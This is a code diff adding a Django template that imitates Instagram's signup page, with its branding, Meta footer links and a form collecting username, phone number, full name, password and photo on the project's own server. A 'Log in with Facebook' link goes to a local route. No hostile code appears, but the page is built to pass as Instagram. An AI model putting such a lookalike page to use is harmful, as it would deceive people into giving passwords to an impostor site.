@@ -1,0 +1,408 @@
+{% comment %} This is instagram signup page {% endcomment %}
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    {% load static %}
+    <link rel="icon" type="image/x-icon" href="{% static "img/icon.avif" %}">
+    <style>
+        .img {
+            width: 200px;
+            padding-top: 35px;
+            padding-bottom: 10px;
+        }
+
+        .signupline {
+            font-size: 19px;
+            font-weight: 600;
+            color: #737373;
+            padding-left: 24px;
+            padding-right: 24px;
+        }
+
+        .icon {
+            display: flex;
+            justify-content: center;
+            border: 1px solid lightgray;
+            background-color: #0095F6;
+            color: white;
+            margin-top: 30px;
+            margin-bottom: 10px;
+            margin-left: 40px;
+            margin-right: 40px;
+            border-radius: 5px;
+            padding: 5px;
+        }
+
+        .logo {
+            color: #ffffff;
+            margin: 0px 8px 0px 0px;
+            background-color: white;
+            padding: 1px;
+            border-radius: 4px;
+        }
+
+        .logfb {
+            font-size: 15px;
+            text-decoration: none;
+            color: white;
+            padding: 5px 2px;
+        }
+
+        .first {
+            text-align: center;
+            border: 1px solid lightgray;
+            margin-top: 0px;
+            margin-bottom: 15px;
+            margin-right: 490px;
+            margin-left: 490px;
+            height: 750px;
+
+        }
+
+        input[type='submit'] {
+            width: 260px;
+            height: 38px;
+            padding: 5px;
+            margin-top: 15px;
+            border-radius: 6px;
+            border: 1px solid lightgray;
+            background-color: #5aa7ff;
+            color: white;
+            font-weight: 700;
+        }
+
+        .or {
+            display: flex;
+            margin-top: 20px;
+            opacity: 0.6;
+            font-size: 13px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .OR {
+            margin-top: 8px;
+            padding-left: 20px;
+            padding-right: 20px;
+
+        }
+
+        .line {
+            opacity: 0.6;
+        }
+
+        input[type='tel'],
+        [type='text'],
+        [type='password'] {
+            width: 250px;
+            height: 15px;
+            padding: 10px;
+            margin-bottom: 8px;
+            border: 1px solid lightgray;
+            font-size: 12px;
+            background-color: #FAFAFA;
+        }
+
+        input[type='file'] {
+            padding: 5px;
+        }
+
+        .div {
+            font-size: 13px;
+            color: #737373;
+            margin-left: 50px;
+            margin-right: 50px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        .div a {
+            text-decoration: none;
+        }
+
+        .div2 {
+            font-size: 13px;
+            color: #737373;
+            margin-left: 50px;
+            margin-right: 50px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+        }
+
+        .div2 a {
+            text-decoration: none;
+        }
+
+        button {
+            margin-top: 5px;
+            width: 250px;
+            padding: 7px;
+            border-radius: 5px;
+            border: 1px solid lightgray;
+            color: white;
+            background-color: #0095F6;
+        }
+
+        .second {
+            margin-left: 36.5%;
+            margin-right: 36.5%;
+            padding: 20px;
+            text-align: center;
+            border: 1px solid lightgray;
+        }
+
+        .second a {
+            text-decoration: none;
+            color: #0095F6;
+        }
+
+        .get {
+            text-align: center;
+            padding: 15px;
+        }
+
+        .img1 {
+            padding-left: 545px;
+            padding-bottom: 10px;
+            height: 40px;
+        }
+
+        .img2 {
+            padding-left: 0px;
+            padding-bottom: 10px;
+            height: 40px;
+        }
+
+        .div3 {
+            margin: 60px 250px 15px 250px;
+            font-size: 12px;
+        }
+
+        .div3 a {
+            text-decoration: none;
+            color: #737373;
+        }
+
+        .link {
+            padding-right: 15px;
+        }
+
+        .language {
+            margin-top: 0px;
+            margin-left: 450px;
+            margin-right: 450px;
+            margin-bottom: 40px;
+            color: #737373;
+
+        }
+
+        .language span {
+            color: #737373;
+            margin-left: 30px;
+        }
+        @media (max-width: 1150px) {
+            .first {
+                margin-left: 10px;
+                margin-right: 10px;
+            }
+    
+            .language {
+                margin-left: 50px;
+                margin-right: 50px;
+            }
+            .div3{
+                margin: 10px 0;
+            }
+        }
+    
+        /* For screen size <= 600px */
+        @media (max-width: 600px) {
+            .first {
+                margin-left: 5px;
+                margin-right: 5px;
+            }
+            .second{
+                width: 150px;
+                margin: 0 90px;
+                font-size: 13px;
+            }
+    
+            .language {
+                margin-left: 20px;
+                margin-right: 20px;
+            }
+    
+            .signupline {
+                font-size: 16px;
+            }
+    
+            .icon {
+                margin-left: 20px;
+                margin-right: 20px;
+            }
+            .img1, .img2{
+                padding: 10px;
+            }
+        }
+    
+        /* For screen size <= 500px */
+        @media (max-width: 500px) {
+            .first {
+                margin-left: 3px;
+                margin-right: 3px;
+            }
+            .second{
+                width: 150px;
+                margin: 0 90px;
+                font-size: 13px;
+            }
+            .language {
+                margin-left: 10px;
+                margin-right: 10px;
+            }
+    
+            .signupline {
+                font-size: 14px;
+            }
+    
+            .icon {
+                margin-left: 10px;
+                margin-right: 10px;
+            }
+    
+            input[type='tel'],
+            input[type='text'],
+            input[type='password'],
+            input[type='submit'] {
+                width: 65%;
+                margin-left: 0;
+                margin-right: 0;
+            }
+            .img1, .img2{
+                padding: 10px;
+            }
+        }
+    
+        /* For screen size <= 400px */
+        @media (max-width: 400px) {
+            .first {
+                margin-left: 1px;
+                margin-right: 1px;
+            }
+    
+            .language {
+                margin-left: 5px;
+                margin-right: 5px;
+            }
+    
+            .signupline {
+                font-size: 12px;
+            }
+    
+            .icon {
+                margin-left: 5px;
+                margin-right: 5px;
+            }
+        }
+        
+    </style>
+</head>
+
+<body>
+    <form class="first" method='post' enctype='multipart/form-data'>
+        {% csrf_token %}
+        <img src="{% static "img/insta1.jpg" %}" alt="" class='img'>
+        <div class='signupline'>Sign up to see photos and videos from your friends.</div>
+        <div class="icon">
+            <script src="https://unpkg.com/boxicons@2.1.4/dist/boxicons.js"></script>
+            <box-icon type='logo' name='facebook' class="logo"></box-icon>
+            <a href="{% url "instafacebook" %}" class="logfb">Log in with Facebook</a>
+        </div>
+        <div class="or">
+            <div class='line'>_____________</div>
+            <div class="OR">OR</div>
+            <div class='line'>_____________</div>
+        </div>
+        {% if messages %}
+        {% for message in messages %}
+        <span{% if message.tags %} class="{{ message.tags }}"{% endif %} style='color:red; font-weight: bolder;'>{{ message }}</span>
+        {% endfor %}
+        {% endif %}
+        <input type="text" name="username" id="username" placeholder="Username" required>
+        <input type="tel" name="number" id="number" placeholder="Mobile Number " required>
+        <input type="text" name="fullname" id="fullname" placeholder="Full Name" required>
+        <input type="password" name="password" id="password" placeholder="Password" required>
+        <input type="password" name="confirmpass" id="confirmpass" placeholder="Re Enter Password" required> <br>
+        <label for="image"
+        style="background-color: #FAFAFA; padding: 5px; border: 1px solid lightgray;color:#737373;position: relative; left: -40px; top: 10px;  ">Choose Your
+        Profile Photo</label><br><br>
+        <input type="file" name="image" id="image"  required>
+
+        <div class="div">People who use our service may have uploaded your contact information to Instagram. <a
+                href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Learn More</a></div>
+        <div class="div2">
+            By signing up, you agree to our <a href="">Terms</a>, <a href="">Privacy Policy</a> and <a href="">Cookies
+                Policy</a>
+        </div>
+        <button>Sing up</button>
+    </form>
+    <div class="second">
+        Have an account?
+        <a href="{% url "insta" %}">Log in</a>
+    </div>
+
+    <div class="get">Get the app.</div>
+    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&hl=en&gl=US" target="_blank">
+        <img src="{% static "img/google.png" %}" alt="" class='img1'>
+    </a>
+    <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-us&gl=US" target="_blank">
+        <img src="{% static "img/microsoft.png" %}" alt="" class='img2'>
+    </a>
+
+
+    <div class="div3">
+        <a href="https://about.meta.com/" target="_blank" class='link'>Meta</a>
+        <a href="https://about.instagram.com/" target="_blank" class='link'>About</a>
+        <a href="https://about.instagram.com/blog" target="_blank" class='link'>Blog</a>
+        <a href="https://about.instagram.com/about-us/careers" class='link'>Jobs</a>
+        <a href="https://help.instagram.com/" target="_blank" class='link'>Help</a>
+        <a href="https://developers.facebook.com/docs/instagram" target="_blank" class='link'>API</a>
+        <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect"
+            class='link'>Privacy</a>
+        <a href="https://help.instagram.com/581066165581870/" class='link'>Terms</a>
+        <a href="https://www.instagram.com/explore/locations/" class='link'>Location</a>
+        <a href="https://www.instagram.com/web/lite/" class='link'>Instagram Lite</a>
+        <a href="https://www.threads.net/login" target="_blank" class='link'>Threads</a>
+        <a href="https://www.facebook.com/help/instagram/261704639352628" class='link'>Contact Uploading & Non-Users</a>
+        <a href="https://about.meta.com/technologies/meta-verified/" target="_blank" class='link'>Meta Verified</a>
+    </div>
+    <div class="language">
+        <select name="" id="">
+            <option value="en">English</option>
+            <option value="af">Afrikaans</option>
+            <option value="ar">العربية</option>
+            <option value="cs">Čeština</option>
+            <option value="da">Dansk</option>
+            <option value="de">Deutsch</option>
+            <option value="el">Ελληνικά</option>
+            <option value="en-gb">English (UK)</option>
+            <option value="es">Español (España)</option>
+            <option value="es-la">Español</option>
+            <option value="fa">فارسی</option>
+            <option value="fi">Suomi</option>
+            <option value="fr">Français</option>
+            <option value="he">עברית</option>
+            <option value="id">Bahasa Indonesia</option>
+            <option value="te">తెలుగు</option>
+            <option value="kn">ಕನ್ನಡ</option>
+            <option value="fr-ca">Français (Canada)</option>
+        </select>
+        <span>2024 Instagram from Meta</span>
+    </div>
+</body>
+
+</html>
